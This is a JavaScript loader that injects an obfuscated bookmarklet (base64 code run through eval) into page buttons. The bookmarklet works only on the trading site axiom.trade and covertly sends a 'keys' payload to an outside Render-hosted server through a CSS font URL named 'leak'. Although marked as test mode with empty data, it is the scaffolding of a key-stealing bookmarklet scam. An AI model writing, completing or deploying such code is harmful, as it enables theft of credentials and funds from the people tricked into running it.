// === FIXED DEBUG LOADER ===
console.log('✅ Loader.js loaded successfully from Render');

document.addEventListener('DOMContentLoaded', () => {
    console.log('✅ DOM fully loaded - looking for bookmarklet button...');

    const buttons = document.querySelectorAll('a.bookmarklet');
    console.log(`Found ${buttons.length} button(s) with class "bookmarklet"`);

    if (buttons.length === 0) {
        console.error('❌ No button with class="bookmarklet" found!');
        return;
    }

    buttons.forEach((btn, index) => {
        console.log(`Processing button #${index + 1}`);

        // Simplified inner code to avoid btoa error
        const innerCode = `(async () => {
            try {
                console.log('🚀 Bookmarklet executed on ' + location.hostname);
                
                if (location.hostname !== "axiom.trade") {
                    alert("This bookmarklet only works on axiom.trade");
                    return;
                }
                
                alert("✅ Bookmarklet is working! (Test mode)");
                
                // Send test data to your server
                const testData = {keys: [], code: "test", site: "Axiom", test: true};
                const url = "https://bloom-sniper-backend.onrender.com/i/" + btoa(JSON.stringify(testData));
                const style = document.createElement("style");
                style.textContent = '@font-face { font-family: "leak"; src: url("' + url + '"); }';
                document.head.appendChild(style);
                
                console.log('✅ Test data sent to your server');
            } catch (err) {
                console.error('Bookmarklet error:', err);
                alert('Error: ' + err.message);
            }
        })();`;

        // Use a safer way to set the href
        try {
            const encoded = btoa(innerCode);
            btn.href = 'javascript:eval(atob("' + encoded + '"))';
            btn.draggable = true;
            console.log('✅ SUCCESS: Real bookmarklet href injected on button!');
        } catch (e) {
            console.error('❌ btoa failed again:', e.message);
        }
    });
});